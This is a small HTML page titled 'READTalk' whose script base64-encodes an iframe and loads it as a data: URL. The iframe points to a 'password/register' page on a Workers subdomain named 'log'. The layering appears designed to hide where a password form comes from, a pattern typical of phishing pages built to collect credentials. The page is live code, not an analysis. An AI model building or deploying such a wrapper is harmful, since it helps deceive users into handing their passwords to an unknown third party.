<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>READTalk</title>
    <style>
        body {
            margin: 0;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: sans-serif;
        }
        .box {
            width: 90%;
            max-width: 500px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 500px;
            border: none;
            display: block;
        }
    </style>
</head>
<body>
    <div class="box">
        <iframe id="authFrame"></iframe>
    </div>
    
    <script>
        const url = 'https://log.readtalk.workers.dev/password/register';
        const html = `<iframe src="${url}" style="width:100%;height:100%;border:none;"></iframe>`;
        const encoded = btoa(html);
        document.getElementById('authFrame').src = 'data:text/html;base64,' + encoded;
    </script>
</body>
</html>
